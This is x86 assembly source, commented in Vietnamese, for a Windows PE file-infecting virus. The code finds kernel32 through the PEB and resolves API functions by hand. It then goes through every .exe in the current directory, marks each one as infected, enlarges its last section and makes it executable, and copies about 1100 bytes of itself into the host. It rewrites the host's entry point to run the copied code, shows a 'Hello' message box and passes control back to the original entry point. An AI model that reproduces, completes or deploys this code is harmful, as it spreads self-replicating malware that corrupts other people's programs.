[SECTION .text]

global _start
_start:
	xor eax, eax       
	mov eax, [fs:30h]                      ; eax -> cau truc PEB
	test eax, eax                                        ;Win 9x ???
	js find_kernel32_9x                            ; dung thi nhay toi Win9x
find_kernel32_nt:                                       ;sai thi day la Windows nt/2000/xp
	mov eax, [eax + 0ch]                         ; eax -> cau truc ve cac Module da duoc LOAD
	mov esi, [eax + 1ch]                         ; eax -> Entry dau tien cua cau truc nay
	lodsd                                                   ; eax -> Entry tiep theo la dia chi thong tin cua  Kernel32.DLL
	mov eax, [eax + 08h]                          ; eax -> Dia chi co so cua Kernel32.DLL                                    
	jmp find_kernel32_finished               ; Xong phan tim dia chi cua Kernel32.DLL
find_kernel32_9x:
	mov eax, [eax + 34h]
	lea eax, [eax + 7ch]
	mov eax, [eax + 3ch]
find_kernel32_finished:

; Lay dia chi cua mot ham GetProcAddress() bang ma Assembly    
; EAX : DIA CHI CUA MODULE KERNEL32.DLL
	push eax                                              ; luu dia chi Kernel32.dll
find_function:                                     
	mov edi, eax                                        ; edi -> Kernel32.dll
	mov eax, [edi + 3ch]                         ; eax -> PE Header
	mov edx, [edi + eax + 78h]              
	add edx, edi                                        ; edx -> Export Directory Table
	mov ecx, [edx + 018h]                        ; ecx -> So luog ham xuat -> dung lam bien dem
	mov ebx, [edx + 020h]                        
	add ebx, edi                                        ; ebx -> Export Name Pointe Table
find_function_loop:                           
	dec ecx                                                 ; giam bo dem ecx
	shl ecx,2
	mov esi,  [ebx+ecx]                           
	add esi, edi                                                             ; esi -> chuoi chua ten mot ham                                                 
	push edi                                              
	jmp strFuncName
find_function_compare:
	pop  edi                                               ; edi -> chuoi chua ten muon tim                           
	cld        	; dinh huong tien
	shr ecx,2
	push ecx                                              ; luu ecx                           
	mov ecx,14                                          ; do dai cua ham GetProcAddress la 14
	repe cmpsb                                                             ; so sanh theo tung byte khi con bang nhau                             
	pop ecx
	pop edi
	jne find_function_loop                       ; neu khong bang thi nhay toi find_function_loop
																 ; neu bang thi tim dia chi thuc theo cac buoc 
	sub ecx,1
	mov ebx, [edx + 024h]                                                                
	add ebx, edi                                        ; ebx -> dia chi cua Ordinal Table
	shl ecx,1
	mov cx, [ebx +  ecx]                       ; ecx la chi so cua ham can tim trong Address Table
	
	mov ebx, [edx + 01ch]                                            
	add ebx, edi                                        ; ebx -> dia chi cuar Address Table
	shl ecx,2
	mov ebx, [ebx + ecx] 
	add ebx, edi                                        ; eax -> chinh la dia chi Ham GetProcAddress                          
find_function_finished: 
	pop eax                                               ; phuc hoi dia chi Kernel32.dll vao eax
; EBX la dia chi cua ham GETPROCADDRESS

; 
; Goi ham LoadLibrary
	push ebx                                              ; luu dia chi ham GetProcAddress
	push eax                                              ; luu dia chi Kernel32.dll
	
;Lay cac dia chi ham trong kernel32.dll
	;GetWindowsDirectory
	call LoadLibraryAddr
	; eax chua dia chi ham LoadLibraryA sau lenh call
	call ModuleUser32 
	; eax chua addr usr32.dll 
	pop edx 	; Kernel32
	pop ebx  	;ebx chua dia chi  GetProcAddress
	
	call AEP_Return						; luu Old AEP cua file Mapping 
	mov ecx, [ecx]
	push ecx 																;0- Old AEP 
	
	push eax 	; cat User32.dll											;1
	push edx	; cat  Kernel32												;2
	push ebx	; cat GetProcAddress										;3
	
	mov edi,eax  ;User32.dll
	mov esi,ebx 	;GetProcAddress
	
	
	call FindFirstFileA
	push eax 	;FindFirstFileA
	push edx 	;Kernel32
	call esi 	;GetProcAddress
	mov ecx,eax
	
	call WIN32_FIND_DATA	; eax chua dia chi tra ve
	push eax 				;luu tru dia chi Struct WIN32_FIND_DATA			;4  - WIN32_FIND_DATA Addr
	
	call EXE_File			; ebx chua dia chi tra ve
	push eax			
	push ebx
	call ecx			;FindFirstFileA
	
	push eax 			; cat handle cho FindNextFile				;5	- Handle Nexfile
	
NextFile:	
	pop eax 		;	;5	- Handle Nexfile
	pop ecx 		;WIN32_FIND_DATA
	push ecx 		; 
	push eax 		
	
	mov ebx,ecx
	add ebx,44 ; tro den filename  
	

	mov edx, [esp+12]   ; kernel32
	mov esi,[esp+8]				;GetProcAddress
	
	call CreateFileA
	push eax
	push edx

	call esi		;GetProcAddress
	push 0
	push 0
	push 3
	push 0
	push 1
	push 0C0000000h 
	push ebx 
	call eax 		;CreateFileA
	cmp eax,0
	je FindNext
	push eax 		;cat  file handle							;6 - File Handle
	
	mov edx,  [esp+16]   ; kernel32

	call CreateFileMappingW
	push eax
	push edx 	;Kernel32
	call esi 	;GetProcAddress
	
	pop ebx		;file handle
	
	push ebx												;6 - File Handle
	
	mov ecx,  [ESP+8]     ; tro den WIN32_FIND_DATA
	add ecx,32			; file size
	mov ecx,  [ecx]
	add ecx,650h	;
	
	
	
	push 0					
	push ecx
	push 0
	push 4
	push 0
	push ebx	;file handle
	call eax ;	call CreateFileMappingW
	cmp eax,0
	je Close_File

	push eax ; cat handle for MapViewOfFile					;7- File Mapping Handle
	
	
	mov ecx,  [ESP+12]     ; tro den WIN32_FIND_DATA
	add ecx,32			; file size
	mov ecx,  [ecx]
	add ecx,650h
	
	call NewFileSize
	mov [eax],ecx
	
	push ecx 				; 7,5 
	
	mov edx,   [esp+24]   ; kernel32
	mov edi,   [esp+20]		; GetProcAddress
	call MapViewOfFile
	
	push eax 	;MapViewOfFile
	push edx
	call edi ;GetProcAddress
	
	pop ecx 				;
	
	pop ebx  ;handle					; 6 ---
	
	push ebx   							;7------

	
	push ecx
	push 0
	push 0
	push 2
	push ebx
	call eax	;MapViewOfFile
	cmp eax,0 
	je Close_map
	
	mov esi,eax    ; esi = base of map 
	
	push esi 													;8- Map of view
	
	; Check PE File ?
	cmp  word  [esi],'MZ'
	jne Unmap_view
	cmp word  [esi+3Ah],'LV'  ; 	sign file
	je HandleEndOfFile               
	mov word  [esi+3Ah],'LV'
    mov ebx,  [esi+3ch]           ;jump to pe header
    cmp word  [esi+ebx], 'PE'           ; Portable Exe ?
    jne Unmap_view 
	add esi, ebx                           ; ESI points to PE header
	
	push esi 		;push PE Header									;9 -PE Header

	;Increasing the last section
	;First -Let's find VA of last section header
	mov ebx, [esi+74h]                     ;  Number of directories entries
    shl ebx, 3                             ; * 8 - Size of Data Directorys 
    xor eax, eax                           
    mov ax, word  [esi+6h]              ; Number of sections
    dec eax                                ; Last Section
    mov ecx, 28h                           ; size of sections' header
    mul ecx                                ; EAX = ECX * EAX 
    add esi, 78h                           
    add esi, ebx                           
    add esi, eax                           ; ESI = Pointer to the last section header
	
	mov  dword [esi+24h],0F0000020h
                  
	;## Write new  virtual size = old size + size of shellcode
    add dword  [esi+8h],1100       ; and increase virtual size
	
	mov edi, [esi+0Ch]                      ; Get new VS address
	add edi, [esi + 8h] 				;VS Addr + VS Size 
	
	pop ebx  			; ebx points to PE Header						;8
	
	push ebx      ;	9 - PE Header 
	
	mov [ebx+50h],edi   	; Add it to SizeOfImage
	
	call AEP_Return						; luu Old AEP cua file Mapping 
	mov edx,[ebx+28h]
	mov   [ecx], edx     ;AEP old
	
	mov eax, [esi+8h]
	xor edx,edx
	mov ecx, [ebx+3ch]  ; file alignement 
	mov ebx,ecx
	div ecx						; Get remainder in EDX
	sub ebx,edx 
	
	mov eax, [esi+8h]                      ; Get current VirtualSize
    add eax, ebx                    ; EAX = SizeOfRawdata padded
    mov [esi+10h], eax                     ; Set new SizeOfRawdata
	
	;Compute the new AEP of shellcode 
	mov eax, [esi+0ch]                     ; Get VirtualAddress
    add eax, [esi+8h]                      ; Add VirtualSize
    sub eax, 1100                      ; Deduct size of virus
	
	pop ebx ; 	9 - PE Header 
	
	mov  [ebx+28h] ,eax;  update new AEP
		
	; Tim vi tri de ghi shellcode
	mov eax, [esi+14h]                     ; File offset of sec's rawdata
    add eax, [esi+8h]                      ; Add VirtualSize of section
    sub eax, 1100                      ; Deduct virus length from it
	
	pop ebx  ; map of view 					;8 
	add eax,  ebx       ; align in memory to map address
	
	push ebx   									; 8 - MapViewOfFile
	
	mov ecx,400000h
	mov ebx,  [ecx+3ch]
	add ecx, ebx
	mov ebx,[ecx+28h] 		;AEP of host  = location of shellcode	
	add ebx,400000h
	;mov ebx,[edx+34h]    ;image_base
	;add ebx,edi    ;   new AEP+  image_base = VA 
	
	
	mov edi, eax                           ; Location to copy to...
	mov esi,  ebx                 ; Location to copy from...   VA of shellcode
	mov ecx, 1100                      ; No. of bytes to copy
	rep movsb                              ; Copy all the bytes!
     
Unmap_view:
	call UnmapViewOfFile
	
	push eax 		; string UnmapViewOfFile
	
	mov ecx,  [esp+24]	;GetProcAddress
	mov edx,   [esp+28]		;Kernel32
	push edx
	call ecx 		;eax = Addr of UnmapViewOfFile Function 
	call eax 		;pop 8

Close_map:
	call CloseHandle
	push eax

	mov ecx,  [esp+20]	;GetProcAddress
	mov edx,   [esp+24]		;Kernel32
	push edx
	call ecx 		;eax = Addr of CloseHandle
	
	call eax 		;pop 7
EndOfFile:
	call NewFileSize
	mov eax,[eax]
	push eax 
	
	call SetFilePoint
	push eax 
	mov ecx,  [esp+20]	;GetProcAddress
	mov edx,   [esp+24]		;Kernel32
	push edx
	call ecx 		;eax = Addr of CloseHandle
	
	pop ebx	;Size 
	pop edx   ; Handle
	push edx 
	
	push 0
	push 0
	push ebx
	push edx
	call eax 	;SetFilePointer
	
	call SetEnd_File
	push eax 
	mov ecx,  [esp+16]	;GetProcAddress
	mov edx,   [esp+20]		;Kernel32
	push edx 
	call ecx
	
	pop edx   ; Handle
	push edx 
	
	push edx 
	call eax ; SetEndOfFile
	
Close_File: 
	call CloseHandle
	push eax

	mov ecx,  [esp+16]	;GetProcAddress
	mov edx,   [esp+20]		;Kernel32
	push edx
	call ecx 		;eax = Addr of CloseHandle
	
	call eax 		;pop 6
FindNext:	
	; FindNextFile
	call FindNextFile
	push eax
	
	mov ecx,  [esp+12]	;GetProcAddress
	mov edx,  [esp+16]		;Kernel32
	push edx
	call ecx 		;eax = Addr of FindNextFile
	
	pop ebx       ;file Handle
	pop ecx      ;	WIN32_FIND_DATA
	
	push ecx
	push ebx
	
	push ecx
	push ebx
	call eax ;  FindNextFile(handle, WIN32_FIND_DATA)
	  
	cmp eax,0
	je ExecuteShell
	jmp NextFile
ExecuteShell:
	
	mov esi,   [esp+16]		;User32.dll
	mov edi,   [esp+8]			; GetProcAddress
	
	call MessageBoxAddr
	push eax	;dia chi MessageBoxA
	push esi	;User32.dll
	call edi     ; GetProcAddress
	
	call  Message
	push 0
	push ebx
	push ebx
	push 0
	call eax 	;MessageBox
	
	mov eax , [esp +20]   ; AEP old
	add eax,400000h
	jmp eax 
	
HandleEndOfFile:
	call NewFileSize
	sub dword [eax],650h
	jmp Unmap_view
	
GetFileSize:
	pop eax 
	ret
NewFileSize:
	call GetFileSize
	dd 0FFFFFFFFh
GetGetFilePoint:
	pop eax 
	ret 
SetFilePoint:
	call GetGetFilePoint
	db 'SetFilePointer',0
GetSetEndFile:
	pop eax
	ret
SetEnd_File:
	call GetSetEndFile
	db 'SetEndOfFile',0
GetAEP_Return:
	pop ecx 
	ret
AEP_Return:
	call GetAEP_Return
	dd 0FFFFFFFFh
GetCloseHandle:
	pop eax
	ret
CloseHandle:
	call GetCloseHandle
	db 'CloseHandle',0
GetFindNext:
	pop eax
	ret
FindNextFile:
	call GetFindNext
	db 'FindNextFileA',0
GetUnMapAddr:
	pop eax
	ret 
UnmapViewOfFile:
	call GetUnMapAddr
	db 'UnmapViewOfFile',0
LoadLib:
	push eax 
	call ebx 
	ret				;dua dia chi ve lenh tiep theo cua noi goi
LoadLibraryAddr:
	call LoadLib
	db 'LoadLibraryA',0
strFuncName:
	call find_function_compare
	db   'GetProcAddress',0
GetUser32:
	call eax 		; eax chua dia chi ham LoadLibrary va tra ve dia chi user32
	ret
ModuleUser32:
	call GetUser32
	db 'User32.dll',0
GetMessBoxAddr:
	pop eax
	ret
MessageBoxAddr:
	call GetMessBoxAddr
	db 'MessageBoxA',0
MessageAddr:
	pop ebx
	ret 
Message:
	call MessageAddr
	db 'Hello',0
ExitProc:
	pop eax
	;mov eax
ExitProcessAddr:
	call ExitProc
	db 'ExitProcess',0
GetCreatFile:
	pop eax
	ret
CreateFileA:
	call GetCreatFile
	db 'CreateFileA',0
GetExeName:
	pop ebx
	ret
EXE_File:
	call GetExeName
	db '*.exe',0
GetMapView:
	pop eax 
	ret
MapViewOfFile:
	call GetMapView
	db 'MapViewOfFile',0
GetCreatFileMap:
	pop eax
	ret
CreateFileMappingW:
	call GetCreatFileMap
	db 'CreateFileMappingW',0
FindFirst:
	pop eax 
	ret 
FindFirstFileA:
	call FindFirst
	db 'FindFirstFileA',0
FindFileData:
	pop eax
	ret
WIN32_FIND_DATA:
	call FindFileData
	dw 0,0,0,0,0,0,0,0,0,0
	dw 0,0,0,0,0,0,0,0,0,0
	dw 0,0,0,0,0,0,0,0,0,0